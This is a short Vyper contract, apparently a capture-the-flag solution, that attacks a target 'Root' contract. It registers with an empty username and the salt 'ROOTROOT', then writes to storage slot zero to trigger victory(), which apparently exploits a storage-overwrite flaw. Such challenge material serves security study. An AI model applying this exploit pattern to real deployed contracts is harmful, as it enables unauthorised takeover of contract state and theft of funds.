# @version ^0.3.7

interface IRoot:
    def register(
        username: String[32],
        salt: String[32],
    ): nonpayable
    def write(
        slot: bytes32,
        data: bytes32,
    ): nonpayable
    def victory() -> bool: view

owner: immutable(address)

root: IRoot

@external
@payable
def __init__(_root: address):
    owner = msg.sender
    self.root = IRoot(_root)

@external
def attack():
    assert msg.sender == owner, "!owner"
    self.root.register("", "ROOTROOT")
    self.root.write(
        empty(bytes32),
        convert(1, bytes32),
    )
    assert self.root.victory(), "!victory"
